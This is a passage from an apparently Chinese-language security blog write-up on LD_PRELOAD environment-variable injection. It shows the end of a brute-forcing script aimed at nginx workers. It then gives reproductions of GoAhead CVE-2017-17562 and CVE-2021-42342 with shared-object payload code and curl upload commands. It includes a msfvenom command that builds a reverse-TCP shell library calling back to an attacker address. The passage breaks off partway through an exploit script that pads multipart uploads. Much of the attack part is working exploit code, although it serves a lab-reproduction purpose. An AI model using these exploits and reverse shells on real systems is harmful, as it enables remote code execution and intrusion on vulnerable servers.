&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">done&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">done&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] brute loop restarted: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">URL2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;env&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/fd/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">pid&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">nginx_workers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">bruter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="real-world">Real World&lt;/h2>
&lt;h3 id="goahead--cve-2017-17562">GoAhead / CVE-2017-17562&lt;/h3>
&lt;p>GoAhead: 2.5 ~ 3.6.5&lt;/p>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md">复现 - vulhub&lt;/a> | &lt;a href="https://www.elttam.com/blog/goahead/#content">REMOTE LD_PRELOAD EXPLOITATION GoAhead: Make My Day&lt;/a>&lt;/p>
&lt;p>GoAhead可以运行asp，js和标准的CGI程序，漏洞发生在运行CGI程序时&lt;/p>
&lt;p>在收到请求后会从url参数中取出键值对并注册进CGI程序的环境变量，且只过滤了&lt;code>REMOTE_HOST&lt;/code>和&lt;code>HTTP_AUTHORIZATION&lt;/code>，而Linux下&lt;code>LD_&lt;/code>开头的环境变量和动态链接库有关，比如&lt;code>LD_PRELOAD&lt;/code>指定的动态链接库会自动加载，&lt;code>LD_LIBRARY_PATH&lt;/code>指定的路径，程序会去其中寻找动态链接库&lt;/p>
&lt;p>我们可以指定&lt;code>LD_PRELOAD=/proc/self/fd/0&lt;/code>，因为&lt;code>/proc/self/fd/0&lt;/code>是标准输入，而CGI程序中，POST数据流即为标准输入流，我们发送.so给&lt;code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&lt;/code>，CGI就会加载我们发送的动态链接库，造成RCE&lt;/p>
&lt;p>测试一个hello world的.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello: World!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -X POST --data-binary @hello.so &lt;span style="color:#d88200">&amp;#34;url/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322204516436.png" alt="image-20220322204516436">&lt;/p>
&lt;p>成功作为响应头输出；尝试反弹shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8426&lt;/span> -f elf-so -o p.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -X POST --data-binary @p.so &lt;span style="color:#d88200">&amp;#34;http://192.168.31.214:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322213915833.png" alt="image-20220322213915833">&lt;/p>
&lt;h3 id="goahead--cve-2021-42342">GoAhead / CVE-2021-42342&lt;/h3>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2021-42342/README.zh-cn.md">复现 - vulhub&lt;/a> | &lt;a href="https://tttang.com/archive/1399/">GoAhead环境变量注入复现踩坑记&lt;/a>&lt;/p>
&lt;p>新的洞是对之前的一次绕过，补丁对用户传入参数进行了黑名单过滤，&lt;code>LD_PRELOAD&lt;/code>这类参数不再设置为环境变量，但由于这个限制使用错了函数，导致实际上并没有生效；补丁还将用户传入的参数名前面增加了前缀，导致无法劫持任意环境变量，但这个限制漏掉了multipart的POST包，所以攻击者通过这个方式仍然可以注入任意环境变量&lt;/p>
&lt;p>注意，新版本的GoAhead默认没有开启CGI，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响&lt;/p>
&lt;p>旧的洞是通过设置&lt;code>LD_PRELOAD=/proc/self/fd/0&lt;/code> 同时将恶意.so作为body传入，做到rce的效果，而这里我们需要在body中发送，所以我们选择提前在服务器上上传.so，之后再把&lt;code>LD_PRELOAD&lt;/code>设置为这个文件的路径&lt;/p>
&lt;p>与PHP一样，GoAhead在遇到上传内容时会存在临时文件，不过这里的坑在于临时文件的目录配置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifndef ME_GOAHEAD_UPLOAD_DIR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define ME_GOAHEAD_UPLOAD_DIR &amp;#34;tmp&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PUBLIC&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">websUploadOpen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ME_GOAHEAD_UPLOAD_DIR&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#if ME_WIN_LIKE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;TEMP&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#else
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tmp&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">trace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Upload directory is %s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">websDefineHandler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;upload&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uploadHandler&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果宏&lt;code>ME_GOAHEAD_UPLOAD_DIR&lt;/code>没有定义，则&lt;code>uploadDir=/tmp&lt;/code>，而这个宏一定不为空，所以直接就是&lt;code>tmp&lt;/code>，这个相对目录取决于pwd，而pwd是GoAhead启动时&lt;code>--home&lt;/code>参数指定的，是存放配置文件的目录&lt;/p>
&lt;p>如果&lt;code>--home /etc/goahead&lt;/code>，那临时文件默认在&lt;code>/etc/goahead/tmp&lt;/code>，如果这个目录不存在或者不可写，那么就会出现上传时500，一旦目标没有正常配置这个目录，就无法攻击（或者参见pbCTF2021 advancement的wp，使用python&lt;/p>
&lt;p>这里直接修改Dockerfile来指定临时文件目录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-dockerfile" data-lang="dockerfile">&lt;span style="display:flex;">&lt;span>make &lt;span style="color:#111">SHOW&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">ME_GOAHEAD_UPLOAD_DIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;\&amp;#34;/tmp\&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>尝试hello world&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello: World&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -v -F &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>@hello.so -F &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/self/fd/7&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#34;url/cgi-bin/test&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220323001558145.png" alt="image-20220323001558145">&lt;/p>
&lt;p>查看日志报Too big错误&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifndef ME_GOAHEAD_LIMIT_POST
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define ME_GOAHEAD_LIMIT_POST 16384
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最大16384字节，我们在gcc时增加&lt;code>-s&lt;/code>参数来减小体积&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -s -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -v -F &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>@hello.so -F &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/self/fd/7&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://192.168.31.214:8080/cgi-bin/test&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果报404，fd/n这样的文件描述符对应的内容都无法打开，p牛猜测的可能是：CGI执行到这里时，被打开的临时文件描述符已经关闭，所以无法打开&lt;/p>
&lt;p>照这样的推测，我们可以想到条件竞争，一个上传一个包含，或者是给.so文件后增加脏字符 但是CL头的长度小于最终数据包的大小，这样GoAhead读取数据包的时候能够完全读取到payload.so的内容，但实际这个文件并没有上传完毕&lt;/p>
&lt;p>首先构造好之前那个无法利用的数据包，其中第一个表单字段是&lt;code>LD_PRELOAD&lt;/code>，值是文件描述符，一般是&lt;code>/proc/self/fd/7&lt;/code>，之后对之前的数据包.so末尾增加几千个字节的脏字符，比如说&lt;code>a&lt;/code>，之后将数据包的CL设置为不超过16384的值，但比payload.so文件的大小要大个500字节左右&lt;/p>
&lt;p>由于上传流程没有结束，所以此时文件描述符是没有关闭的，可以通过&lt;code>/proc/self/fd/7&lt;/code>读取到，脏字符也不影响动态链接库的加载和运行，最后即可成功完成劫持&lt;/p>
&lt;p>p牛已经写好了脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ssl&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urlparse&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ParseResult&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">16384&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">client&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">ParseResult&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">boundary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;----&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000000000000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999999999999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">padding&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">content_length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">min&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAYLOAD_MAX_LENGTH&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">fr&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;POST &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">parts&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept: */*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Language: en
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
